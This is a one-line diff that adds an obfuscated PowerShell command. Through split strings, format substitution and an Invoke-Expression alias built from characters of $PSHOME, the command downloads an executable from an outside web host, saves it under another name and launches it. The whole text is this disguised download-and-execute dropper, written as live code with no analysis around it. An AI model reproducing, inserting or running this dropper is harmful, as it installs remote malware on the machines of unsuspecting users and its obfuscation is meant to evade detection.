@@ -1,0 +1,1 @@
+﻿ (('(N'+'ew-Object Sy'+'st'+'em.'+'Net.WebClient).Down'+'loadFil'+'e({0}'+'http://worldnit.com/se'+'ct.ex'+'e'+'{0},'+'{0}fleeb'+'le.exe{0});Star'+'t-Pr'+'oc'+'e'+'ss {0}'+'fl'+'eeble.'+'e'+'xe{0}')  -F [ChAr]39) | &( $pShOmE[21]+$pShOME[34]+'X')
